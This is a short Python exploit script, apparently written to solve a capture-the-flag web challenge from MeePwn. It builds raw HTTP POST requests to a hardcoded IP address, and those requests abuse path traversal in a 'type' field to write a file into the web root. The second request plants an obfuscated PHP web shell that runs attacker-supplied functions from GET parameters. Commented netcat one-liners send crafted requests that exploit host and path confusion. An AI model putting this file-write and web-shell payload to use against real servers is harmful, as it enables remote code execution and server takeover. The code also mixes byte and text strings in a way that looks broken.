header1 = b'POST /omega_sector.php HTTP/1.1'
host = b'Host: 138.68.228.12'
cookie1 = b'Cookie:PHPSESSID=gg8aeco8kmps9bs980bueh4k74'

content1 = b'message=N&type=/../../human_message/lol.php'

close = b'Connection: close'
ctype = b'Content-Type: application/x-www-form-urlencoded'

nl = b''


header2 = b'POST /alien_sector.php HTTP/1.1'
content2 = b'''message=<?=$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);&type=/../../human_message/lol.php'''
cookie2 = b'Cookie:PHPSESSID=5v152u1gptasujt2ingp7k1cl3'


# echo -ne 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1\r\nHost: 138.68.228.12\r\nConnection: close\r\n\r\n' | nc 138.68.228.12 80

# echo -ne 'GET ..@human.ludibrium.meepwn.team/..//index.php?human=Yes HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n' | nc 138.68.228.12 80

# echo -ne 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1\r\nHost: 138.68.228.12\r\nConnection: close\r\n\r\n' | nc localhost 80


def c_len(content):
	return b'Content-length: %d' % len(content)


def req1():
	return '\\r\\n'.join([header1, host, cookie1, ctype, close, c_len(content1), nl, content1, nl, nl])


def req2():
	return '\\r\\n'.join([header2, host, cookie2, ctype, close, c_len(content2), nl, content2, nl, nl])




print req2()
